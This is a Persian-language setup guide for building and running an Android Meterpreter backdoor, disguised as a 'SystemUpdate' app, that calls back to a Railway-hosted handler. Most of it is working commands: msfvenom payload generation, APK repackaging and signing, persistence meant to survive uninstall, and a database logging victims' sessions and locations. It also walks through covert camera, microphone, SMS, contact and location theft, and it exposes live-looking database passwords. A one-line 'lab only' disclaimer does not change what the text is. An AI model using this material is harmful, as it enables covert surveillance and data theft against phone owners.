# 🚀 Railway Professional APK - Complete Setup Guide
## راهنمای کامل نصب و پیکربندی

---

## 📋 فهرست مطالب
1. [مقدمه](#مقدمه)
2. [پیش‌نیازها](#پیش‌نیازها)
3. [پیکربندی Railway](#پیکربندی-railway)
4. [ساخت APK حرفه‌ای](#ساخت-apk-حرفه‌ای)
5. [راه‌اندازی Handler](#راه‌اندازی-handler)
6. [نصب و تست](#نصب-و-تست)
7. [استفاده از دیتابیس](#استفاده-از-دیتابیس)
8. [عیب‌یابی](#عیب‌یابی)

---

## 🎯 مقدمه

این پروژه یک سیستم کامل برای دسترسی دائمی و ریموت به دستگاه‌های Android در محیط آزمایشگاهی ارائه می‌دهد.

### ویژگی‌های کلیدی:
- ✅ **رمزنگاری پیشرفته**: HTTPS + TLS با گواهی RSA-4096
- ✅ **دسترسی دائمی**: حتی بعد از حذف اپلیکیشن
- ✅ **اتصال عمومی**: از طریق Railway TCP Proxy
- ✅ **پایداری چندلایه**: 5 مکانیزم مختلف
- ✅ **دیتابیس PostgreSQL**: ذخیره session ها و داده‌ها
- ✅ **کنترل کامل**: دسترسی به تمام قابلیت‌های دستگاه

---

## 💻 پیش‌نیازها

### سیستم حمله (Parrot OS)

```bash
# 1. نصب Metasploit Framework
sudo apt update
sudo apt install -y metasploit-framework

# 2. نصب ابزارهای Android
sudo apt install -y apktool zipalign apksigner android-sdk

# 3. نصب ADB
sudo apt install -y adb

# 4. نصب Java
sudo apt install -y default-jdk

# 5. نصب PostgreSQL client
sudo apt install -y postgresql-client

# 6. نصب Python dependencies
sudo apt install -y python3-psycopg2
```

### دستگاه Android (آزمایشگاه)
- Android 8.0+ (API Level 26+)
- Developer Mode فعال
- USB Debugging فعال
- اتصال اینترنت

### Railway Platform
- پروژه فعال Railway
- TCP Proxy پیکربندی شده (port 29210)
- دیتابیس PostgreSQL متصل
- Environment Variables تنظیم شده

---

## ⚙️ پیکربندی Railway

### 1. Environment Variables

در Railway Dashboard → Settings → Variables:

```bash
DATABASE_URL=postgresql://postgres:oNnmkkGTsBScDMhJGyuPWbHqfBegneKo@postgres.railway.internal:5432/railway

LHOST=0.0.0.0
LPORT_ANDROID=29210

RAILWAY_TCP_PROXY_DOMAIN=metro.proxy.rlwy.net
RAILWAY_TCP_PROXY_PORT=29210

ROOT_PASSWORD=8181

# PostgreSQL (auto-configured)
PGHOST=postgres.railway.internal
PGPORT=5432
POSTGRES_DB=railway
POSTGRES_USER=postgres
POSTGRES_PASSWORD=oNnmkkGTsBScDMhJGyuPWbHqfBegneKo
```

### 2. Networking

**Public Access (برای اتصال از بیرون):**
```
Domain: metro.proxy.rlwy.net
Port: 29210
```

**Internal Network (برای سرویس‌های داخلی):**
```
Service: metasploit-framework1.railway.internal
Database: postgres.railway.internal:5432
```

**Static Outbound IP:**
```
208.77.244.15 (برای اتصالات خروجی)
```

---

## 📱 ساخت APK حرفه‌ای

### روش 1: اتوماتیک (توصیه می‌شود)

```bash
cd /home/offsec/Documents/GitHub/metasploit-framework1

# اجرای اسکریپت ساخت APK
./build_railway_professional.sh
```

**خروجی:** `SystemUpdate_Railway_Professional.apk`

### روش 2: دستی (گام‌به‌گام)

```bash
# 1. تولید payload پایه
msfvenom -p android/meterpreter/reverse_https \
    LHOST=metro.proxy.rlwy.net \
    LPORT=29210 \
    SessionRetryTotal=100 \
    SessionRetryWait=10 \
    -o base_payload.apk

# 2. Decompile
apktool d -f base_payload.apk -o decompiled

# 3. ویرایش AndroidManifest.xml
# (اضافه کردن permissions و services - مراجعه به اسکریپت)

# 4. اضافه کردن کلاس‌های Persistence
# (PersistenceService.smali و BootReceiver.smali)

# 5. Rebuild
apktool b decompiled -o rebuilt.apk

# 6. Zipalign
zipalign -f -v 4 rebuilt.apk aligned.apk

# 7. تولید keystore (فقط بار اول)
keytool -genkeypair -v \
    -keystore railway-key.keystore \
    -alias railwaykey \
    -keyalg RSA \
    -keysize 4096 \
    -sigalg SHA512withRSA \
    -validity 10000 \
    -storepass Railway@2025 \
    -keypass Railway@2025 \
    -dname "CN=System Update, OU=Android, O=System, L=City, ST=State, C=US"

# 8. امضا
apksigner sign \
    --ks railway-key.keystore \
    --ks-key-alias railwaykey \
    --ks-pass pass:Railway@2025 \
    --key-pass pass:Railway@2025 \
    --v1-signing-enabled true \
    --v2-signing-enabled true \
    --v3-signing-enabled true \
    --out SystemUpdate_Railway_Professional.apk \
    aligned.apk

# 9. تایید
apksigner verify --verbose SystemUpdate_Railway_Professional.apk
```

### بررسی APK

```bash
# اطلاعات APK
aapt dump badging SystemUpdate_Railway_Professional.apk

# اندازه فایل
ls -lh SystemUpdate_Railway_Professional.apk

# Checksum
md5sum SystemUpdate_Railway_Professional.apk
sha256sum SystemUpdate_Railway_Professional.apk

# بررسی امضا
apksigner verify --verbose SystemUpdate_Railway_Professional.apk
```

---

## 🗄️ راه‌اندازی دیتابیس

### 1. پیکربندی دیتابیس

```bash
cd /home/offsec/Documents/GitHub/metasploit-framework1

# اجرای اسکریپت پیکربندی
./configure_railway_db.sh
```

### 2. ایجاد جداول (در Railway Terminal)

```bash
# کپی فایل SQL به Railway
# یا استفاده از Railway CLI

# اجرای SQL
PGPASSWORD=oNnmkkGTsBScDMhJGyuPWbHqfBegneKo \
psql -h postgres.railway.internal -U postgres -d railway \
-f /tmp/railway_persistence_tables.sql
```

### 3. تست اتصال دیتابیس

```bash
# تست ساده
PGPASSWORD=oNnmkkGTsBScDMhJGyuPWbHqfBegneKo \
psql -h postgres.railway.internal -U postgres -d railway \
-c "SELECT version();"

# بررسی جداول
PGPASSWORD=oNnmkkGTsBScDMhJGyuPWbHqfBegneKo \
psql -h postgres.railway.internal -U postgres -d railway \
-c "\dt"
```

---

## 🚀 راه‌اندازی Handler

### روش 1: با دیتابیس (توصیه می‌شود)

```bash
cd /home/offsec/Documents/GitHub/metasploit-framework1

# شروع handler با دیتابیس
msfconsole -r railway_handler_final.rc
```

### روش 2: بدون دیتابیس

```bash
msfconsole -r railway_handler_professional.rc
```

### روش 3: دستی

```bash
msfconsole

# اتصال به دیتابیس
db_connect postgresql://postgres:oNnmkkGTsBScDMhJGyuPWbHqfBegneKo@postgres.railway.internal:5432/railway

# بررسی وضعیت دیتابیس
db_status

# پیکربندی handler
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 29210

# SSL Configuration
set HandlerSSLCert /root/.msf4/ssl/cert.pem
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai

# Session Configuration
set SessionCommunicationTimeout 0
set SessionExpirationTimeout 0
set SessionRetryTotal 100
set SessionRetryWait 10
set ExitOnSession false

# Advanced
set EnableUnicodeEncoding true
set PrependMigrate true
set PrependMigrateProc com.android.systemui

# شروع
exploit -j -z
```

### تایید Handler

```bash
# در msfconsole
msf6 > jobs
msf6 > 

# در ترمینال دیگر
netstat -tulpn | grep 29210
```

---

## 📲 نصب و تست

### 1. انتقال APK به دستگاه

**روش A: از طریق ADB**
```bash
adb devices
adb push SystemUpdate_Railway_Professional.apk /sdcard/
```

**روش B: از طریق شبکه**
```bash
# راه‌اندازی HTTP server
cd /home/offsec/Documents/GitHub/metasploit-framework1
python3 -m http.server 8000

# در دستگاه Android:
# Browser -> http://YOUR_IP:8000/SystemUpdate_Railway_Professional.apk
```

### 2. نصب APK

**از طریق ADB:**
```bash
# فعال‌سازی unknown sources
adb shell settings put global install_non_market_apps 1

# نصب
adb install SystemUpdate_Railway_Professional.apk

# بررسی نصب
adb shell pm list packages | grep systemupdate
```

**دستی روی دستگاه:**
```
1. Settings > Security > Unknown Sources (فعال کنید)
2. File Manager > SystemUpdate_Railway_Professional.apk
3. Install
```

### 3. راه‌اندازی APK

```bash
# شروع اپلیکیشن
adb shell am start -n com.android.systemupdate/.MainActivity

# بررسی process
adb shell ps | grep systemupdate
```

### 4. مانیتور Session

```bash
# در msfconsole
msf6 > sessions -l

# هر 5 ثانیه بررسی
watch -n 5 'msfconsole -q -x "sessions -l; exit"'
```

### 5. اتصال به Session

```bash
msf6 > sessions -l
Active sessions
===============
  Id  Name  Type                   Information              Connection
  --  ----  ----                   -----------              ----------
  1         meterpreter android    Android 11 @ device      0.0.0.0:29210 -> X.X.X.X

msf6 > sessions -i 1

meterpreter > sysinfo
meterpreter > getuid
meterpreter > pwd
```

---

## 🔧 نصب Persistence

### روش 1: اتوماتیک

```bash
# در Parrot OS
cd /home/offsec/Documents/GitHub/metasploit-framework1

# نصب ماژول‌های persistence
./install_persistence_modules.sh

# اجرای persistence installer
msfconsole -r install_persistence.rc
```

### روش 2: دستی

```bash
# در msfconsole با session فعال
use post/android/manage/advanced_persistence
set SESSION 1
set LHOST metro.proxy.rlwy.net
set LPORT 29210
set INSTALL_NATIVE true
set INSTALL_BOOT true
set INSTALL_SERVICE true
run

# نصب multi-vector persistence
use post/android/manage/multi_persist
set SESSION 1
run
```

### تست Persistence

**Test 1: Force Stop**
```bash
adb shell am force-stop com.android.systemupdate
sleep 10
# بررسی: session باید همچنان active باشد
```

**Test 2: Reboot**
```bash
adb reboot
sleep 60
# بررسی: session باید خودکار برقرار شود
```

**Test 3: Uninstall**
```bash
adb uninstall com.android.systemupdate
# بررسی: با persistence mechanisms، backdoor باید active بماند
```

---

## 📊 استفاده از دیتابیس

### Query های سریع

```bash
cd /home/offsec/Documents/GitHub/metasploit-framework1

# نمایش session های فعال
./db_query.sh sessions

# آمار
./db_query.sh stats

# مکانیزم‌های persistence
./db_query.sh persist

# موقعیت مکانی
./db_query.sh locations

# داده‌های جمع‌آوری شده
./db_query.sh data
```

### Query های دستی

```bash
# تعریف متغیرهای محیطی
export PGPASSWORD="oNnmkkGTsBScDMhJGyuPWbHqfBegneKo"
export PGHOST="postgres.railway.internal"
export PGUSER="postgres"
export PGDATABASE="railway"

# Session های فعال
psql -c "SELECT * FROM v_active_sessions;"

# آمار کلی
psql -c "SELECT COUNT(*) as total_sessions, 
                COUNT(CASE WHEN is_active THEN 1 END) as active,
                COUNT(CASE WHEN root_access THEN 1 END) as rooted 
         FROM persistent_sessions;"

# آخرین موقعیت‌ها
psql -c "SELECT session_uuid, timestamp, latitude, longitude, address 
         FROM device_locations 
         ORDER BY timestamp DESC LIMIT 10;"
```

---

## 🎮 دستورات Post-Exploitation

### اطلاعات سیستم

```bash
meterpreter > sysinfo
meterpreter > getuid
meterpreter > pwd
meterpreter > ps
```

### مدیریت فایل

```bash
# لیست فایل‌ها
meterpreter > ls
meterpreter > cd /sdcard
meterpreter > ls DCIM/Camera

# دانلود
meterpreter > download /sdcard/DCIM/Camera/IMG_001.jpg /root/

# آپلود
meterpreter > upload /root/file.txt /sdcard/
```

### دوربین

```bash
# لیست دوربین‌ها
meterpreter > webcam_list

# عکس‌برداری
meterpreter > webcam_snap

# استریم ویدیو
meterpreter > webcam_stream
```

### میکروفون

```bash
# ضبط 30 ثانیه
meterpreter > record_mic -d 30

# ضبط 2 دقیقه
meterpreter > record_mic -d 120
```

### موقعیت مکانی

```bash
meterpreter > geolocate
```

### اسکرین‌شات

```bash
meterpreter > screenshot
meterpreter > screenshare
```

### استخراج داده‌ها

```bash
# مخاطبین
meterpreter > dump_contacts

# پیامک‌ها
meterpreter > dump_sms

# تاریخچه تماس
meterpreter > dump_calllog
```

### مدیریت اپلیکیشن‌ها

```bash
# لیست اپ‌ها
meterpreter > app_list

# نصب
meterpreter > app_install /sdcard/app.apk

# حذف
meterpreter > app_uninstall com.example.app
```

---

## 🔍 عیب‌یابی

### Problem: Session برقرار نمی‌شود

**راه‌حل:**

```bash
# 1. بررسی handler
jobs
netstat -tulpn | grep 29210

# 2. بررسی اتصال شبکه
ping metro.proxy.rlwy.net
telnet metro.proxy.rlwy.net 29210

# 3. بررسی اینترنت Android
adb shell ping -c 3 8.8.8.8

# 4. بررسی process اپلیکیشن
adb shell ps | grep systemupdate

# 5. بررسی logs
adb logcat | grep -i meterpreter
adb logcat | grep -i exception
```

### Problem: نصب APK شکست می‌خورد

**راه‌حل:**

```bash
# 1. بررسی امضا
apksigner verify SystemUpdate_Railway_Professional.apk

# 2. بررسی نسخه Android
adb shell getprop ro.build.version.sdk
# باید >= 26 باشد

# 3. فعال‌سازی unknown sources
adb shell settings put global install_non_market_apps 1
adb shell settings put secure install_non_market_apps 1

# 4. حذف نصب قبلی
adb uninstall com.android.systemupdate

# 5. نصب مجدد
adb install -r SystemUpdate_Railway_Professional.apk
```

### Problem: Persistence کار نمی‌کند

**راه‌حل:**

```bash
# 1. بررسی نصب ماژول‌ها
ls -la ~/.msf4/modules/post/android/manage/

# 2. reload modules
msfconsole -q -x "reload_all; search persistence; exit"

# 3. نصب دستی
use post/android/manage/advanced_persistence
show options
set SESSION 1
run

# 4. بررسی دسترسی‌ها
adb shell dumpsys package com.android.systemupdate | grep permission
```

### Problem: دیتابیس متصل نمی‌شود

**راه‌حل:**

```bash
# 1. تست اتصال
PGPASSWORD=oNnmkkGTsBScDMhJGyuPWbHqfBegneKo \
psql -h postgres.railway.internal -U postgres -d railway -c "SELECT 1;"

# 2. بررسی credentials
env | grep PG

# 3. بررسی config
cat ~/.msf4/database.yml

# 4. اتصال دستی در msfconsole
db_connect postgresql://postgres:oNnmkkGTsBScDMhJGyuPWbHqfBegneKo@postgres.railway.internal:5432/railway
db_status
```

---

## 📈 مانیتورینگ

### Real-time Session Monitoring

```bash
# نمایش session ها
watch -n 5 'msfconsole -q -x "sessions -l; exit"'

# نمایش اتصالات
watch -n 5 'netstat -an | grep 29210'

# نمایش logs
tail -f ~/.msf4/logs/framework.log
```

### Database Monitoring

```bash
# تعداد session های فعال
./db_query.sh stats

# آخرین session ها
./db_query.sh sessions

# نمودار موقعیت
./db_query.sh locations
```

---

## 🔒 نکات امنیتی

⚠️ **مهم:**

1. این ابزار **فقط** برای محیط آزمایشگاهی و تحقیقات امنیتی است
2. استفاده در دستگاه‌های واقعی بدون مجوز **غیرقانونی** است
3. تمام ارتباطات از طریق HTTPS رمزنگاری شده است
4. از VPN یا Tor برای لایه امنیتی اضافی استفاده کنید
5. رمزهای دیتابیس را محفوظ نگه دارید
6. بعد از استفاده، session ها را close کنید

---

## 📞 خلاصه دستورات سریع

### Setup (یکبار)

```bash
cd /home/offsec/Documents/GitHub/metasploit-framework1

# 1. نصب persistence modules
./install_persistence_modules.sh

# 2. پیکربندی دیتابیس
./configure_railway_db.sh

# 3. ساخت APK
./build_railway_professional.sh
```

### استفاده روزمره (در Railway)

```bash
# 1. Start handler
msfconsole -r railway_handler_final.rc

# 2. Monitor sessions
./db_query.sh sessions

# 3. Query data
./db_query.sh stats
```

### در صورت قطع session

```bash
# Handler همیشه در حال اجرا باشد
# APK با persistence خودکار reconnect می‌کند
```

---

## ✅ Checklist استقرار

- [ ] نصب تمام پیش‌نیازها
- [ ] پیکربندی Railway environment variables
- [ ] ایجاد جداول دیتابیس
- [ ] ساخت APK با اطلاعات صحیح
- [ ] تست امضای APK
- [ ] راه‌اندازی handler
- [ ] تست اتصال به دیتابیس
- [ ] نصب APK روی دستگاه آزمایشگاهی
- [ ] تست برقراری session
- [ ] نصب persistence mechanisms
- [ ] تست persistence (reboot, force stop)
- [ ] تست دستورات post-exploitation
- [ ] مستندسازی نتایج

---

**تاریخ ایجاد:** 22 نوامبر 2025  
**نسخه:** 1.0.0 Professional  
**محیط:** Parrot OS + Railway + Android Lab  
**وضعیت:** Production Ready ✅

---

## 🆘 پشتیبانی

در صورت بروز مشکل:
1. بخش [عیب‌یابی](#عیب‌یابی) را مطالعه کنید
2. Logs را بررسی کنید
3. تنظیمات Railway را چک کنید
4. نسخه Android را تایید کنید

**لاگ‌های مهم:**
- `~/.msf4/logs/framework.log`
- `adb logcat`
- Railway application logs

---

**Good Luck! موفق باشید! 🚀**
